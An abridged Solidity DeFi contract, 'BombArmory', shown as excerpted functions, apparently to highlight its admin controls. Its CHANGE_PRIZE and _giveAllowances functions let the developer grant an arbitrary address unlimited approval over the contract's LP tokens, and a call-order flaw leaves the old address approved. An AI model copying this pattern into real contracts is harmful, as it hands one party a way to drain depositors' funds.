...
contract BombArmory is Initializable {
    using SafeMathUpgradeable for uint256;

    IERC20Upgradeable public lp_BOMBBTCB;
    address erctoken;
    ...
    constructor(address _dev, address _prize) initializer {}

    function initialize(address _dev, address _prize) public initializer {
        dev = _dev;
        prize = _prize;
        ...
        MIN_INVEST_LIMIT = 1 * 1e16; /** 0.01 LP  **/
        WALLET_DEPOSIT_LIMIT = 1000 * 1e18; /** 1000 LP  **/
        ...
        PSN = 10000;
        PSNH = 5000;
        lp_BOMBBTCB = IERC20Upgradeable(erctoken);
    }
    ...
    function initializeArmory(uint256 amount) public {
        if (!contractStarted) {
            if (msg.sender != dev) {
                revert("Must be dev.");
            }
    ...
    function CHANGE_PRIZE(address value) external {
        require(msg.sender == dev, "Admin use only.");
        _removeAllowances();
        _giveAllowances();
        prize = value;
    ...
    function _giveAllowances() internal {
        ...
        lp_BOMBBTCB.approve(prize, maxAllowance);
    }

    function _removeAllowances() internal {
        lp_BOMBBTCB.approve(prize, 0);
    }
}
